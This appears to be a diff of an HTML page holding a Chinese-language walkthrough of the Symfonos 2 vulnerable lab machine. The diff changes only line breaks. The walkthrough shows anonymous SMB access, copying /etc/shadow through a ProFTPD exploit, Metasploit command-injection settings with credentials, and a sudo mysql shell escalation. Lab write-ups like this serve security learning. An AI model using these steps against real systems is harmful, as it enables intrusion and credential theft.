@@ -7547,15 +7547,15 @@
 <p><img alt="image.png" src="../img/YIdbFVaIPxicxIJ0/1594597577568-5a7b5a53-ea45-47e3-9c20-b7bc578957aa-824897.png" /></p>
 <p>访问 80 端口有个图片（1920*1080 的还可以用来做壁纸）</p>
 <p><img alt="image.png" src="../img/YIdbFVaIPxicxIJ0/1594598636371-5518d42d-ee18-4a96-9a72-0624be50c73c-346698.png" /></p>
-<p>nmap 扫出来的里面有个 ftp，访问需要验证身份
-还有个 smb，通过 smbclient 连接一下：smbclient //192.168.149.180/anonymous
+<p>nmap 扫出来的里面有个 ftp，访问需要验证身份<br />
+还有个 smb，通过 smbclient 连接一下：smbclient //192.168.149.180/anonymous<br />
 密码那里直接回车就行</p>
 <p><img alt="image.png" src="../img/YIdbFVaIPxicxIJ0/1594600932712-685ed472-1cc8-4757-8120-ba28456057bd-108993.png" /></p>
 <p>把里面的 log.txt 下到本地，然后查看一下，没发现 password 相关的，找到一个 user：aeolus</p>
 <p><img alt="image.png" src="../img/YIdbFVaIPxicxIJ0/1594601854697-7b2cf767-8c39-4c41-9417-cdfacde205f6-240326.png" /></p>
-<p>另外可以看一下 log.txt 第一行的内容
-root@symfonos2:~# cat /etc/shadow &gt; /var/backups/shadow.bak
-用这个脚本，拷贝一下
+<p>另外可以看一下 log.txt 第一行的内容<br />
+root@symfonos2:~# cat /etc/shadow &gt; /var/backups/shadow.bak<br />
+用这个脚本，拷贝一下<br />
 <a href="https://github.com/chcx/cpx_proftpd/">https://github.com/chcx/cpx_proftpd/</a></p>
 <p>然后 get 下来</p>
 <p><img alt="image.png" src="../img/YIdbFVaIPxicxIJ0/1594603966268-ebe8d842-0d9b-46ed-ba26-ba0c930445a4-524618.png" /></p>
@@ -7572,22 +7572,22 @@ root@symfonos2:~# cat /etc/shadow &gt; /var/backups/shadow.bak
 <p>此网址使用了一个通常用于网络浏览以外目的的端口。出于安全原因，Firefox 取消了该请求。</p>
 </blockquote>
 <p>在火狐访问 about:config 然后新建一个</p>
-<p><img alt="image.png" src="../img/YIdbFVaIPxicxIJ0/1594607972637-8b90cdf5-384c-4f06-9238-2d3a3d1051f5-132367.png" />
-首选项名称：
-network.security.ports.banned.override
-值：
+<p><img alt="image.png" src="../img/YIdbFVaIPxicxIJ0/1594607972637-8b90cdf5-384c-4f06-9238-2d3a3d1051f5-132367.png" /><br />
+首选项名称：<br />
+network.security.ports.banned.override<br />
+值：<br />
 0-65535</p>
 <p>就可以访问了</p>
 <p><img alt="image.png" src="../img/YIdbFVaIPxicxIJ0/1594608267504-949557fc-f7a5-4911-85b3-e0a917f9bfce-777975.png" /></p>
-<p>用 msf 的 linux/http/librenms_addhost_cmd_inject 进行攻击
-set rhosts 192.168.149.180
-set rport 6666
-set username aeolus
-set password sergioteamo
+<p>用 msf 的 linux/http/librenms_addhost_cmd_inject 进行攻击<br />
+set rhosts 192.168.149.180<br />
+set rport 6666<br />
+set username aeolus<br />
+set password sergioteamo<br />
 set lhost 192.168.149.180</p>
 <p><img alt="image.png" src="../img/YIdbFVaIPxicxIJ0/1594608248522-3ebbcf31-53da-4111-b2d3-b26f5f95a9e1-812743.png" /></p>
-<p>这时候 sudo -l 可以发现 mysql 是可以不需要密码就能 sudo 运行的
-可以在这里面找 <a href="https://gtfobins.github.io/">https://gtfobins.github.io</a>
+<p>这时候 sudo -l 可以发现 mysql 是可以不需要密码就能 sudo 运行的<br />
+可以在这里面找 <a href="https://gtfobins.github.io/">https://gtfobins.github.io</a><br />
 <code>mysql -e '\! /bin/sh'</code></p>
 <p><img alt="image.png" src="../img/YIdbFVaIPxicxIJ0/1594608396302-d2f97e87-858b-4903-b6ff-bd77054c2539-036396.png" /></p>
 <p><img alt="image.png" src="../img/YIdbFVaIPxicxIJ0/1594608446201-a77aff48-be5d-4943-bf43-55a88977b7b7-809209.png" /></p>
